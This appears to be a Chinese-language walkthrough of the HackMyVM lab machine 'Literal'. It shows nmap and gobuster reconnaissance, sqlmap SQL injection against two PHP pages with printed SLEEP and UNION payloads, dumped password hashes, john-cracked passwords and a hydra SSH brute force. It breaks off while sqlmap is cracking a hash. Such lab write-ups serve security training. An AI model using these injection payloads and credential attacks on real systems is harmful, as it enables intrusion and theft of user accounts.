# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Nmap scan report for 192.168.21.5
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p- 192.168.21.5        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 00:44 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
MAC Address: 08:00:27:4C:64:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# 漏洞利用

在/etc/hosts中添加192.168.21.5和blog.literal.hmv

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git -u http://blog.literal.hmv/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.literal.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
/images               (Status: 301) [Size: 321] [--> http://blog.literal.hmv/images/]                                           
/index.html           (Status: 200) [Size: 3325]
/login.php            (Status: 200) [Size: 1893]
/register.php         (Status: 200) [Size: 2159]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 320] [--> http://blog.literal.hmv/fonts/]                                            
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

在/register.php注册个账号然后/login.php进行登录看一下

<img width="685" height="242" alt="图片" src="https://github.com/user-attachments/assets/8f4c1503-cfd6-4d8a-8760-c3a672c14c0f" />

<img width="909" height="451" alt="图片" src="https://github.com/user-attachments/assets/00740633-9eb1-461f-8a02-8e6958489e24" />

尝试一下sql注入

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -l 1.txt --dbs        
        ___
       __H__                                                    
 ___ ___[,]_____ ___ ___  {1.9.6#stable}                        
|_ -| . [)]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:45:21 /2025-09-07/

[01:45:21] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
[1/1] URL:
GET http://blog.literal.hmv:80/next_projects_to_do.php
Cookie: PHPSESSID=fuom74hboeofplr8l0g3g2sk6i
POST data: sentence-query=1
do you want to test this URL? [Y/n/q]
> y
[01:45:24] [INFO] testing URL 'http://blog.literal.hmv:80/next_projects_to_do.php'                                              
[01:45:24] [INFO] using '/home/kali/.local/share/sqlmap/output/results-09072025_0145am.csv' as the CSV results file in multiple targets mode
[01:45:24] [INFO] testing connection to the target URL
[01:45:24] [INFO] testing if the target URL content is stable
[01:45:24] [INFO] target URL content is stable
[01:45:24] [INFO] testing if POST parameter 'sentence-query' is dynamic
[01:45:24] [WARNING] POST parameter 'sentence-query' does not appear to be dynamic
[01:45:24] [WARNING] heuristic (basic) test shows that POST parameter 'sentence-query' might not be injectable
[01:45:24] [INFO] testing for SQL injection on POST parameter 'sentence-query'                                                  
[01:45:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                    
[01:45:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                            
[01:45:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'            
[01:45:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                 
[01:45:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                           
[01:45:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                           
[01:45:25] [INFO] testing 'Generic inline queries'
[01:45:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                          
[01:45:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                               
[01:45:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                        
[01:45:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                  
[01:45:35] [INFO] POST parameter 'sentence-query' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[01:45:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                        
[01:45:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[01:45:38] [INFO] target URL appears to be UNION injectable with 5 columns
[01:45:38] [INFO] POST parameter 'sentence-query' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                  
POST parameter 'sentence-query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: sentence-query (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sentence-query=1' AND (SELECT 6054 FROM (SELECT(SLEEP(5)))nQfN) AND 'vQQY'='vQQY

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: sentence-query=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787671,0x5547644e6c414573794258486b71654c686f725a4a4f785247654a6c6568746a5574766161584f45,0x71716b7a71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] y
[01:45:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[01:45:39] [INFO] fetching database names
available databases [4]:
[*] blog
[*] information_schema
[*] mysql
[*] performance_schema

[01:45:40] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0145am.csv'                             

[*] ending @ 01:45:40 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -l 1.txt -D blog --tables
        ___
       __H__                                                    
 ___ ___[']_____ ___ ___  {1.9.6#stable}                        
|_ -| . [.]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:46:58 /2025-09-07/

[01:46:58] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
[1/1] URL:
GET http://blog.literal.hmv:80/next_projects_to_do.php
Cookie: PHPSESSID=fuom74hboeofplr8l0g3g2sk6i
POST data: sentence-query=1
do you want to test this URL? [Y/n/q]
> y
[01:46:59] [INFO] testing URL 'http://blog.literal.hmv:80/next_projects_to_do.php'                                              
[01:46:59] [INFO] resuming back-end DBMS 'mysql' 
[01:46:59] [INFO] using '/home/kali/.local/share/sqlmap/output/results-09072025_0146am.csv' as the CSV results file in multiple targets mode
[01:46:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: sentence-query (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sentence-query=1' AND (SELECT 6054 FROM (SELECT(SLEEP(5)))nQfN) AND 'vQQY'='vQQY

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: sentence-query=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787671,0x5547644e6c414573794258486b71654c686f725a4a4f785247654a6c6568746a5574766161584f45,0x71716b7a71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] y
[01:47:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[01:47:00] [INFO] fetching tables for database: 'blog'
Database: blog
[2 tables]
+----------+
| projects |
| users    |
+----------+

[01:47:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0146am.csv'                             

[*] ending @ 01:47:00 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -l 1.txt -D blog -T users --dump
        ___
       __H__                                                    
 ___ ___[.]_____ ___ ___  {1.9.6#stable}                        
|_ -| . [(]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:48:26 /2025-09-07/

[01:48:26] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
[1/1] URL:
GET http://blog.literal.hmv:80/next_projects_to_do.php
Cookie: PHPSESSID=fuom74hboeofplr8l0g3g2sk6i
POST data: sentence-query=1
do you want to test this URL? [Y/n/q]
> y
[01:48:28] [INFO] testing URL 'http://blog.literal.hmv:80/next_projects_to_do.php'                                              
[01:48:28] [INFO] resuming back-end DBMS 'mysql' 
[01:48:28] [INFO] using '/home/kali/.local/share/sqlmap/output/results-09072025_0148am.csv' as the CSV results file in multiple targets mode
[01:48:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: sentence-query (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sentence-query=1' AND (SELECT 6054 FROM (SELECT(SLEEP(5)))nQfN) AND 'vQQY'='vQQY

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: sentence-query=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176787671,0x5547644e6c414573794258486b71654c686f725a4a4f785247654a6c6568746a5574766161584f45,0x71716b7a71),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] y
[01:48:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[01:48:29] [INFO] fetching columns for table 'users' in database 'blog'
[01:48:29] [INFO] fetching entries for table 'users' in database 'blog'
Database: blog
Table: users
[18 entries]
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
| 18     | 123       | 123@qq.com                       | $2y$10$Nogv1GSSdUTkwFqMY/nhiuBQfiH55Tchyq3gStmp6ljiRrXOotIuS | 2025-09-07 05:22:00 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+

[01:48:29] [INFO] table 'blog.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/blog.literal.hmv/dump/blog/users.csv'                                                            
[01:48:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0148am.csv'                             

[*] ending @ 01:48:29 /2025-09-07/
```

将其保存下来并进行破解

```
┌──(kali㉿kali)-[~]
└─$ john --show pass.txt 
?:test
?:carlos12
?:123456789
?:slipknot
?:hellokitty
?:741852963
?:butterfly
?:michael1
?:monica
?:147258369
?:kelsey
?:zxcvbnm,./
?:50cent
?:123
```

爆破一下，但是没有成功

```
┌──(kali㉿kali)-[~]
└─$ hydra -L user.txt -P pass.txt ssh://192.168.21.5   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-07 05:35:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:18/p:14), ~16 tries per task
[DATA] attacking ssh://192.168.21.5:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-07 05:36:54
```

在邮箱中发现forumtesting.literal.hmv，在/etc/hosts中添加一下,访问http://forumtesting.literal.hmv会跳到/category.php

```
┌──(kali㉿kali)-[~]
└─$ curl http://forumtesting.literal.hmv/category.php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!-- jQuery -->
<title>c4TLoUis forum</title> 
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="css/style.css">
</head>
<body class="">
<div class="container" style="min-height:500px;">
        <div class="container">
        <div class="row">
                <h2>Discussion Forum | About... Imagination</h2>
                <h3><a href="category.php">Home</a> | <a href="login.php">Login</a> | <a href="cp_login.php">Control Panel</a></h3>


                                        <div class="single category">
                                <ul class="list-unstyled">
                                        <li><span style="font-size:25px;font-weight:bold;">Categories</span> <span class="pull-right"><span style="font-size:20px;font-weight:bold;">Topics / Posts</span></span></li>
                                                               <li><a href="category.php?category_id=2" title="">Forum details <span class="pull-right">0 / 0</span></a></li>
                                                               <li><a href="category.php?category_id=1" title="">New things for the blog <span class="pull-right">0 / 0</span></a></li>
                                                               </ul>
                   </div>
                </div>
</div>
<div class="insert-post-ads1" style="margin-top:20px;">

</body>
</html>
```

发现了会跳转到category.php?category_id=2和category.php?category_id=1，尝试SQL注入

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" --dbs
        ___
       __H__                                                    
 ___ ___[)]_____ ___ ___  {1.9.6#stable}                        
|_ -| . [(]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:07:25 /2025-09-07/

[05:07:25] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i22h1s4iub5...odh6ljfn5r'). Do you want to use those [Y/n] y
[05:07:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:07:27] [INFO] testing if the target URL content is stable
[05:07:27] [INFO] target URL content is stable
[05:07:27] [INFO] testing if GET parameter 'category_id' is dynamic
[05:07:27] [INFO] GET parameter 'category_id' appears to be dynamic
[05:07:27] [WARNING] heuristic (basic) test shows that GET parameter 'category_id' might not be injectable
[05:07:27] [INFO] testing for SQL injection on GET parameter 'category_id'                                                      
[05:07:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                    
[05:07:27] [WARNING] reflective value(s) found and filtering out
[05:07:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                            
[05:07:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'            
[05:07:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                 
[05:07:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                           
[05:07:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                           
[05:07:28] [INFO] testing 'Generic inline queries'
[05:07:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                          
[05:07:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                               
[05:07:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                        
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                  
[05:07:48] [INFO] GET parameter 'category_id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable     
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[05:07:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                        
[05:07:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:07:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:07:53] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
[05:07:55] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')                                                  
[05:07:55] [INFO] target URL appears to be UNION injectable with 1 columns
[05:07:55] [INFO] checking if the injection point on GET parameter 'category_id' is a false positive
GET parameter 'category_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[05:08:38] [INFO] the back-end DBMS is MySQL
[05:08:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[05:08:38] [INFO] fetching database names
[05:08:38] [INFO] fetching number of databases
[05:08:38] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[05:09:11] [INFO] adjusting time delay to 1 second due to good response times
3
[05:09:11] [INFO] retrieved: information_schema
[05:11:06] [INFO] retrieved: performance_schema
[05:12:57] [INFO] retrieved: forumtesting
available databases [3]:
[*] forumtesting
[*] information_schema
[*] performance_schema

[05:14:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 72 times
[05:14:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 05:14:16 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" -D forumtesting --tables
        ___
       __H__                                                    
 ___ ___[,]_____ ___ ___  {1.9.6#stable}                        
|_ -| . ["]     | .'| . |                                       
|___|_  [.]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:20:33 /2025-09-07/

[05:20:33] [INFO] resuming back-end DBMS 'mysql' 
[05:20:33] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=1lqb93c1bl9...s3e3671pdm'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[05:21:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[05:21:00] [INFO] fetching tables for database: 'forumtesting'
[05:21:00] [INFO] fetching number of tables for database 'forumtesting'                                                         
[05:21:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[05:21:39] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
5
[05:21:49] [INFO] retrieved: 
[05:21:59] [INFO] adjusting time delay to 1 second due to good response times
forum_category
[05:23:31] [INFO] retrieved: forum_owner
[05:24:19] [INFO] retrieved: forum_posts
[05:25:11] [INFO] retrieved: forum_topics
[05:26:06] [INFO] retrieved: forum_users
Database: forumtesting
[5 tables]
+----------------+
| forum_category |
| forum_owner    |
| forum_posts    |
| forum_topics   |
| forum_users    |
+----------------+

[05:26:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 05:26:48 /2025-09-07/
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://forumtesting.literal.hmv/category.php?category_id=1" -D forumtesting -T forum_owner --dump
        ___
       __H__                                                    
 ___ ___[(]_____ ___ ___  {1.9.6#stable}                        
|_ -| . ["]     | .'| . |                                       
|___|_  [(]_|_|_|__,|  _|                                       
      |_|V...       |_|   https://sqlmap.org                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:14:15 /2025-09-07/

[06:14:15] [INFO] resuming back-end DBMS 'mysql' 
[06:14:15] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=v5p5ga41ijk...tke50atlns'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 1383 FROM (SELECT(SLEEP(5)))xNgV)
---
[06:14:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0.12
[06:14:16] [INFO] fetching columns for table 'forum_owner' in database 'forumtesting'
[06:14:16] [INFO] resumed: 5
[06:14:16] [INFO] resumed: created
[06:14:16] [INFO] resumed: email
[06:14:16] [INFO] resumed: id
[06:14:16] [INFO] resumed: password
[06:14:16] [INFO] resumed: username
[06:14:16] [INFO] fetching entries for table 'forum_owner' in database 'forumtesting'
[06:14:16] [INFO] fetching number of entries for table 'forum_owner' in database 'forumtesting'                                 
[06:14:16] [INFO] resumed: 1
[06:14:16] [INFO] resumed: 2022-02-12
[06:14:16] [INFO] resumed: carlos@forumtesting.literal.htb
[06:14:16] [INFO] resumed: 1
[06:14:16] [INFO] resumed: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
[06:14:16] [INFO] resumed: carlos
[06:14:16] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[06:14:17] [INFO] writing hashes to a temporary file '/tmp/sqlmaphevyecj1170215/sqlmaphashes-elmqvfdz.txt'                      
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[06:14:18] [INFO] using hash method 'sha512_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[06:15:09] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[06:15:11] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
[06:15:11] [INFO] starting 8 processes 
[06:15:17] [INFO] using suffix '1'                             
[06:15:23] [INFO] using suffix '123'                           
[06:15:30] [INFO] using suffix '2'                             
[06:15:36] [INFO] using suffix '12'                            
[06:15:43] [INFO] using suffix '3'                             
[06:15:51] [INFO] using suffix '13'                            
[06:15:57] [INFO] using suffix '7'                             
[06:16:05] [INFO] using suffix '11'                            
[06:16:12] [INFO] using suffix '5'                             
[06:16:19] [INFO] using suffix '22'                            
[06:16:26] [INFO] using suffix '23'                            
[06:16:33] [INFO] using suffix '01'                            
[06:16:39] [INFO] using suffix '4'                             
[06:16:46] [INFO] using suffix '07'                            
[06:16:53] [INFO] using suffix '21'                            
[06:17:00] [INFO] using suffix '14'                            
[06:17:07] [INFO] using suffix '10'                            
[06:17:13] [INFO] using suffix '06'                            
[06:17:20] [INFO] using suffix '08'                            
[06:17:26] [INFO] using suffix '8'                             
[06:17:33] [INFO] using suffix '15'                            
[06:17:39] [INFO] using suffix '69'                            
[06:17:46] [INFO] using suffix '16'                            
[06:17:52] [INFO] using suffix '6'                             
[06:17:59] [INFO] using suffix '18'                            
[06:18:06] [INFO] using suffix '!'                             
[06:18:13] [INFO] using suffix '.'                             
